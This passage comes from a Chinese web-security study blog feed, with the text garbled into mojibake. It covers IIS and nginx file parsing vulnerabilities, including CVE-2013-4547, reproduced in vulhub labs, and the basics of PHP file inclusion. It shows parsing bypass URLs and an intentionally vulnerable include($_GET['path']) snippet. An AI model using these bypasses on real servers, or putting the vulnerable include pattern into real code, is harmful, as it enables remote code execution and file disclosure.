src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.57.41.png" style="zoom:55%;"><p>å°è¯•è§£å†³ï¼š</p><p>è¯·æ±‚é™åˆ¶è®¾ç½®æˆæ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.06.34.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.04.25.png" style="zoom:55%;"><p>ä¸è¡Œã€‚æ”¹å›è„šæœ¬ã€‚</p><p>æ¢5.2.17 âœ…ã€‚å¯ä»¥äº†</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.24.22.png" style="zoom:25%;"><p>step2:è§£ææ¼æ´éªŒè¯</p><p>å°†phpè„šæœ¬åç¼€æ”¹ä¸º .png</p><p>è®¿é—®çš„æ—¶å€™åé¢+ /.php</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.29.00.png" style="zoom:75%;"><p>phpè„šæœ¬æ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.30.06.png" style="zoom:75%;"><p>åŸå› ï¼šcgi.fix_pathinfoé»˜è®¤å¼€å¯ã€‚</p><p>step3:é˜²å¾¡</p><p>é˜²å¾¡ï¼š</p><p>æ‰¾åˆ°å¤„ç†æ˜ å°„ç¨‹åº-è¯·æ±‚é™åˆ¶-æ˜ å°„-å‹¾ä¸Š</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.31.45-9179165.png" style="zoom:55%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.32.41.png" style="zoom:35%;"></blockquote><h2 id="3-4-nginxè§£ææ¼æ´"><a href="#3-4-nginxè§£ææ¼æ´" class="headerlink" title="3.4 nginxè§£ææ¼æ´"></a>3.4 nginxè§£ææ¼æ´</h2><h3 id="3-4-1-CGIè§£ææ¼æ´"><a href="#3-4-1-CGIè§£ææ¼æ´" class="headerlink" title="3.4.1 CGIè§£ææ¼æ´"></a>3.4.1 CGIè§£ææ¼æ´</h3><p>åŸç†åŒIIS + PHP CGIè§£ææ¼æ´</p><blockquote><h4 id="EXï¼šnginx-PHP-CGIè§£ææ¼æ´"><a href="#EXï¼šnginx-PHP-CGIè§£ææ¼æ´" class="headerlink" title="EXï¼šnginx +  PHP CGIè§£ææ¼æ´"></a>EXï¼šnginx +  PHP CGIè§£ææ¼æ´</h4><p>1ã€æ¼æ´å¹³å°</p><p>ubuntu 20.04 192.168.33.6</p><p>vulhub-master/</p><p>2ã€æ¼æ´æµ‹è¯•</p><p>å¯åŠ¨docker ç¯å¢ƒ </p><p>è¿›å…¥vulhub-masterç›®å½•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> nginx/nginx_parsing_vulnerability/<span class="token function">sudo</span> <span class="token function">docker-compose</span> build<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­ï¼š</p><p>sudo docker-compose up -d âœ…</p><p>è®¿é—®ï¼š</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.04.04.png" style="zoom:75%;"><p>æ¼æ´æµ‹è¯•ï¼š</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.05.16.png" style="zoom:35%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.05.42.png" style="zoom:35%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.6/uploadfiles/nginx.png/.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¼æ´æˆå› ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.06.29.png" style="zoom:75%;"></blockquote><h3 id="3-4-2-nginxç©ºå­—èŠ‚æ¼æ´"><a href="#3-4-2-nginxç©ºå­—èŠ‚æ¼æ´" class="headerlink" title="3.4.2 nginxç©ºå­—èŠ‚æ¼æ´"></a>3.4.2 nginxç©ºå­—èŠ‚æ¼æ´</h3><p>å°†info.php é‡å‘½åä¸ºinfo.html</p><p>è®¿é—®åè€…ï¼Œä¸èƒ½æ‰§è¡Œã€‚ä½†æ˜¯åé¢ +%00.php ä¹‹åå´å¯ä»¥è§£ææ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.13.07.png" style="zoom:45%;"><p>åŸç†ï¼š</p><ul><li><p>è¯»å–æ•´ä¸ªURLä¹‹åï¼Œå‘ç°ç»“å°¾æ˜¯.phpï¼Œç§»äº¤ç»™PHPè§£é‡Šè¿›ç¨‹æ¥è§£æã€‚</p></li><li><p>PHPè§£æè¿›ç¨‹ä»å‰å¾€åçœ‹ï¼Œåˆ°htmlä¸ºæ­¢ï¼Œåé¢ç›¸å½“äºnullï¼Œè§£ææ‰§è¡Œã€‚</p></li></ul><h3 id="3-4-3-nginxæ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547-ï¼‰"><a href="#3-4-3-nginxæ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547-ï¼‰" class="headerlink" title="3.4.3 nginxæ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE**-2013-4547**ï¼‰"></a>3.4.3 nginx<strong>æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆ</strong>CVE**-2013-4547**ï¼‰</h3><blockquote><h4 id="EXï¼šnginx-æ–‡ä»¶åé€»è¾‘æ¼æ´"><a href="#EXï¼šnginx-æ–‡ä»¶åé€»è¾‘æ¼æ´" class="headerlink" title="EXï¼šnginx æ–‡ä»¶åé€»è¾‘æ¼æ´"></a>EXï¼šnginx æ–‡ä»¶åé€»è¾‘æ¼æ´</h4><p>1ã€å¯åŠ¨ç¯å¢ƒ</p><p>å…ˆå…³é—­ä¹‹å‰å¯åŠ¨çš„ç¯å¢ƒï¼š</p><p>sudo docker-compose down</p><p>è¿›å…¥ç›¸åº”ç›®å½•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> CVE-2013-4547<span class="token function">sudo</span> <span class="token function">docker-compose</span> build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2ã€è®¿é—®8080ç«¯å£æµ‹è¯•</p><p>ä¸Šä¼ info.phpï¼ŒæŠ“åŒ…ã€‚</p><p>ä¼ info.php ä¸Šä¼ å¤±è´¥ï¼šUnsupported filetype uploaded.</p><p>æ–‡ä»¶ååç¼€æ”¹æˆ png ä¸Šä¼ æˆåŠŸï¼šFile uploaded successfully: /var/www/html/uploadfiles/phpinfo.png</p><p><strong>å…³é”®æ­¥éª¤ä¸€ï¼šé€»è¾‘æ¼æ´ æ–‡ä»¶ååé¢+ä¸€ä¸ªç©ºæ ¼</strong></p><p>è®¿é—®çš„æ—¶å€™æŠ“åŒ…ã€‚</p><p>ã€æ–°æ–¹æ³•ï¼šå°†è¯·æ±‚çš„URLå¤åˆ¶åˆ°å‰ªè´´æ¿ repeateræ¨¡å—,å¼€ä¸€ä¸ªæ ‡ç­¾ï¼Œå³é”®ï¼Œç²˜è´´URLä½œä¸ºè¯·æ±‚ã€‘</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.08.17.png" style="zoom:45%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.12.28.png" style="zoom:35%;"><p>å…³é”®æ­¥éª¤äºŒï¼šè®¿é—®çš„è¯·æ±‚ä¸­URL info.php ..php</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.12.48.png" style="zoom:75%;"><p>å…³é”®æ­¥éª¤ä¸‰ï¼šæ‰“å¼€ è¯·æ±‚çš„åå…­è¿›åˆ¶å½¢å¼ï¼Œ</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2025-02-10%2017.30.32.png" style="zoom:50%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.14.08.png" style="zoom:75%;"><p>è¯·æ±‚ä¹‹åï¼Œç›®æ ‡PHPä»£ç è¢«è§£ææ‰§è¡Œã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.16.58.png" style="zoom:45%;"></blockquote><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ–‡ä»¶è§£ææ¼æ´æ˜¯Webå®‰å…¨ä¸­çš„ä¸€ç§æ¼æ´ï¼Œå½“åº”ç”¨ç¨‹åºåœ¨å¤„ç†æ–‡ä»¶æ—¶ï¼Œæœªèƒ½æ­£ç¡®è§£ææ–‡ä»¶å†…å®¹æˆ–æ ¼å¼ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´ä¸Šä¼ æˆ–æäº¤æ¶æ„æ„é€ çš„æ–‡ä»¶ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºæ‰§è¡Œæœªæˆæƒæ“ä½œï¼Œå¦‚è¿œç¨‹ä»£ç æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²æˆ–æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿™ç§æ¼æ´é€šå¸¸æºäºå¯¹æ–‡ä»¶æ‰©å±•åã€å†…å®¹ç±»å‹éªŒè¯ä¸è¶³ï¼Œæˆ–æ–‡ä»¶åè·¯å¾„è¿‡æ»¤ä¸ä¸¥ï¼Œä»¥åŠæ–‡ä»¶å†…å®¹è§£æé€»è¾‘å­˜åœ¨ç¼ºé™·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> æ–‡ä»¶è§£ææ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«æ¼æ´</title>
      <link href="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/"/>
      <url>/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°"><a href="#ä¸€ã€æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°" class="headerlink" title="ä¸€ã€æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°"></a>ä¸€ã€æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°</h1><h2 id="1-1-æ–‡ä»¶åŒ…å«çš„æ¦‚å¿µ"><a href="#1-1-æ–‡ä»¶åŒ…å«çš„æ¦‚å¿µ" class="headerlink" title="1.1 æ–‡ä»¶åŒ…å«çš„æ¦‚å¿µ"></a>1.1 æ–‡ä»¶åŒ…å«çš„æ¦‚å¿µ</h2><p>ç¨‹åºå¼€å‘äººå‘˜é€šå¸¸ä¼šæŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨æŸä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶,æ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§è°ƒç”¨æ–‡ä»¶çš„è¿‡ç¨‹é€šå¸¸ç§°ä¸ºåŒ…å«ã€‚</p><h2 id="1-2-æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#1-2-æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="1.2 æ–‡ä»¶åŒ…å«æ¼æ´"></a>1.2 æ–‡ä»¶åŒ…å«æ¼æ´</h2><p> ç¨‹åºå¼€å‘äººå‘˜éƒ½å¸Œæœ›ä»£ç æ›´åŠ çµæ´»ï¼Œæ‰€ä»¥é€šå¸¸ä¼šæŠŠè¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œæ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä½†æ­£æ˜¯ç”±äºè¿™ç§çµæ´»æ€§ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨ä»»æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>åŸå› ï¼š</p><ul><li><p>è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸ºå˜é‡ã€‚[åŠ¨æ€åŒ…å«]</p></li><li><p>å˜é‡å¯¹ç”¨æˆ·ç«¯æ¥è¯´å¯æ§ã€‚[åŠ¨æ€åŒ…å«çš„æ–‡ä»¶è·¯å¾„ç”¨æˆ·ç«¯å¯æ§]</p></li></ul><p>å±å®³ï¼š</p><ul><li>é˜²å¾¡æªæ–½å‡ ä¹å…¨éƒ¨å¤±æ•ˆï¼Œå¯ä»¥è¿‡å®‰å…¨ç‹—ã€‚ç»æ‹›ã€‚</li></ul><p>å‡ ä¹æ‰€æœ‰çš„è„šæœ¬è¯­è¨€éƒ½ä¼šæä¾›æ–‡ä»¶åŒ…å«åŠŸèƒ½ã€‚æ–‡ä»¶åŒ…å«æ¼æ´åœ¨PHP Web Applicationä¸­å±…å¤šï¼Œåœ¨JSP/ASP/ASP . netç¨‹åºä¸­æ¯”è¾ƒå°‘ã€‚</p><h1 id="äºŒã€PHPæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#äºŒã€PHPæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="äºŒã€PHPæ–‡ä»¶åŒ…å«æ¼æ´"></a>äºŒã€PHPæ–‡ä»¶åŒ…å«æ¼æ´</h1><h2 id="2-1-è¯­å¥"><a href="#2-1-è¯­å¥" class="headerlink" title="2.1 è¯­å¥"></a>2.1 è¯­å¥</h2><p>PHPä¸­æä¾›äº†å››ä¸ªæ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼Œå››ä¸ªå‡½æ•°ä¹‹é—´ç•¥æœ‰åŒºåˆ«ã€‚å¦‚ä¸‹</p><table><thead><tr><th>å‡½æ•°</th><th>åŒºåˆ«</th></tr></thead><tbody><tr><td>include( )</td><td>ç”¨ä¸€æ¬¡åŒ…å«ä¸€æ¬¡ï¼Œæ–‡ä»¶åŒ…å«å¤±è´¥æ—¶ï¼Œä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ä¼šç»§ç»­è¿è¡Œã€‚</td></tr><tr><td>include_once( )</td><td>ä¸include()åŠŸèƒ½ç›¸åŒï¼Œæ–‡ä»¶åªä¼šè¢«åŒ…å«ä¸€æ¬¡ã€‚</td></tr><tr><td>require( )</td><td>æ–‡ä»¶åŒ…å«å¤±è´¥æ—¶ï¼Œä¼šäº§ç”Ÿé”™è¯¯ï¼Œç›´æ¥ç»“æŸè„šæœ¬æ‰§è¡Œã€‚</td></tr><tr><td>require_once( )</td><td>ä¸require()åŠŸèƒ½ç›¸åŒï¼Œæ–‡ä»¶åªä¼šè¢«åŒ…å«ä¸€æ¬¡ã€‚</td></tr></tbody></table><blockquote><h4 id="æµ‹è¯•æ–‡ä»¶åŒ…å«æ–¹æ³•"><a href="#æµ‹è¯•æ–‡ä»¶åŒ…å«æ–¹æ³•" class="headerlink" title="æµ‹è¯•æ–‡ä»¶åŒ…å«æ–¹æ³•"></a>æµ‹è¯•æ–‡ä»¶åŒ…å«æ–¹æ³•</h4><p>1ã€wwwç›®å½•ä¸‹åˆ›å»ºincludeæ–‡ä»¶å¤¹ç”¨ä½œå®éªŒ</p><p> 2ã€åˆ›å»º inc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"This is inc.php"</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3ã€åˆ›å»º include.php</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1&gt;This is include.php&lt;/h1&gt;"</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"./inc.php1"</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"./inc.php"</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%889.08.34.png" style="zoom:45%;"><p>4ã€åˆ›å»ºincludeonce.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>       <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1&gt;This is include_once.php&lt;/h1&gt;"</span><span class="token punctuation">;</span>      <span class="token keyword">include_once</span> <span class="token string double-quoted-string">"./inc.php"</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%889.11.09.png" style="zoom:35%;"><p>5ã€åˆ›å»ºrequire.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1&gt;This is require.php&lt;/h1&gt;"</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string double-quoted-string">"./inc.php1"</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string double-quoted-string">"./inc.php"</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6ã€å°†è¦åŒ…å«çš„æ–‡ä»¶è®¾ç½®æˆå˜é‡ï¼ŒåŠ¨æ€è°ƒç”¨</p><p>åˆ›å»º info.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>include.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./inc.php"</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1&gt;This is include.php&lt;/h1&gt;"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./info.php"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token variable">$path</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%889.22.49.png" style="zoom:35%;"><p>7ã€æ–‡ä»¶åŒ…å«æ¼æ´</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token variable">$path</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"This is includehole.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%889.27.37.png" style="zoom:35%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%889.28.00.png" style="zoom:35%;"><p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æ§åˆ¶pathå‚æ•°ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶åŒ…å«çš„æ–‡ä»¶ï¼Œå¦‚ä¸€äº›æ•æ„Ÿçš„é…ç½®æ–‡ä»¶æˆ–ç³»ç»Ÿæ–‡ä»¶ï¼Œç”šè‡³æ˜¯æ¶æ„è„šæœ¬ï¼ˆwebshellï¼‰ã€‚</p></blockquote><h2 id="2-2-ç›¸å…³é…ç½®"><a href="#2-2-ç›¸å…³é…ç½®" class="headerlink" title="2.2 ç›¸å…³é…ç½®"></a>2.2 ç›¸å…³é…ç½®</h2><p>æ–‡ä»¶åŒ…å«æ˜¯PHPçš„åŸºæœ¬åŠŸèƒ½ä¹‹ä¸€ï¼Œæœ‰æœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ä¹‹åˆ†(è™½ç„¶phpå®˜ç½‘ä¸Šä¸æ˜¯è¿™ä¹ˆè§£é‡Šçš„)ã€‚ç®€å•æ¥è¯´ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«å°±æ˜¯å¯ä»¥è¯»å–å’Œæ‰“å¼€æœ¬åœ°æ–‡ä»¶ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«å°±æ˜¯å¯ä»¥è¿œç¨‹ï¼ˆHTTPã€FTPã€PHPä¼ªåè®®ç­‰ï¼‰åŠ è½½æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>php.ini</code>æ¥è¿›è¡Œé…ç½®ã€‚å¦‚ä¸‹ï¼š</p><h3 id="2-2-1-æœ¬åœ°æ–‡ä»¶åŒ…å«-LFI"><a href="#2-2-1-æœ¬åœ°æ–‡ä»¶åŒ…å«-LFI" class="headerlink" title="2.2.1 æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)"></a>2.2.1 æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)</h3><ul><li>allow_url_fopen=On/Off</li></ul><p>ã€ä¸ç®¡å¼€å’Œå…³éƒ½å¯ä»¥åŒ…å«æœ¬åœ°æ–‡ä»¶ï¼ŒOffä¸èƒ½é€šè¿‡PHPä¼ªåè®®åŠ è½½æ–‡ä»¶ï¼ŒOnå¯ä»¥é€šè¿‡PHPä¼ªåè®®ï¼ˆ<code>php://</code>ï¼‰åŠ è½½æ–‡ä»¶ã€‘</p><p>æœ¬åœ°æ–‡ä»¶åŒ…å«å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›¸å¯¹è·¯å¾„çš„æ–¹å¼æ‰¾åˆ°æ–‡ä»¶ï¼Œç„¶ååŒ…å«ä¹‹ã€‚</p><h3 id="2-2-2-è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#2-2-2-è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="2.2.2 è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)"></a>2.2.2 è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</h3><ul><li>allow_ url_ include=0n/0ff</li></ul><h2 id="2-3-æ–‡ä»¶åŒ…å«ç¤ºä¾‹"><a href="#2-3-æ–‡ä»¶åŒ…å«ç¤ºä¾‹" class="headerlink" title="2.3 æ–‡ä»¶åŒ…å«ç¤ºä¾‹"></a>2.3 æ–‡ä»¶åŒ…å«ç¤ºä¾‹</h2><h3 id="2-3-1-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#2-3-1-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="2.3.1 æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>2.3.1 æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><blockquote><h4 id="EX-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#EX-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="EX:æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>EX:æœ¬åœ°æ–‡ä»¶åŒ…å«</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ç®€å•çš„ä»£ç æ¥æµ‹è¯•æ–‡ä»¶åŒ…å«æ¼æ´ã€‚å‡†å¤‡ä¸€ä¸ªfileinclude.phpæ–‡ä»¶ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?path=info.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥æ–‡ä»¶ä¼šä»GETæ–¹æ³•è·å–pathå˜é‡ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«è·¯å¾„ï¼Œç„¶ååŒ…å«æ­¤æ–‡ä»¶ã€‚</p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶info.php,è¿™ä¸ªåŒ…å«çš„æ–‡ä»¶çš„å†…å®¹ä¸ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI):</p><p>æœ¬åœ°æ–‡ä»¶åŒ…å«å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›¸å¯¹è·¯å¾„çš„æ–¹å¼æ‰¾åˆ°æ–‡ä»¶ï¼Œç„¶ååŒ…å«ä¹‹ã€‚è®¿é—®çš„URLä¸º:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.16.132.138/fileInclude/fileinclude.php?path<span class="token operator">=</span>info.php<span aria-hidden="true" 